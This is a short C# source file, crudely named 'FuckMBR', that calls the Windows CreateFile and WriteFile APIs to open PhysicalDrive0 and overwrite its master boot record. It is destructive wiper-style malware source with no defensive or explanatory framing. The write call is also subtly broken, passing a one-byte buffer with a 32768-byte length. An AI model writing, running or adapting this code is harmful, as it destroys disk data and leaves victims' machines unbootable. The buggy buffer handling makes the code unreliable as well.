﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace FuckMBR
{
    public class FckMBR
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
         IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32.dll")]
        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberBytesWritten, IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        private const uint MbrSize = 32768u;

        public void MBROverwrite(byte data)
        {
            var mbrData = new byte[] { data };
            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }
    }
}
